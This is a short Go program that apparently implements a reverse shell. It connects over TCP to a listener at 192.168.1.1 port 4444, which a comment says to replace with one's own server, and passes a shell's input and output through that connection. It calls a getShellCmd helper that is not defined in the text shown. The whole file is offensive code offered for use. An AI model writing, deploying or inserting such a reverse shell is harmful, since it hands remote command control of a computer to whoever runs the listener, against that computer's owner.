package main

import (
	"net"
)

func main() {
	conn, err := net.Dial("tcp", "192.168.1.1:4444") // modify it with your server listener IP
	if err != nil {
		return
	}
	defer conn.Close()

	cmd := getShellCmd()
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	cmd.Run()
}
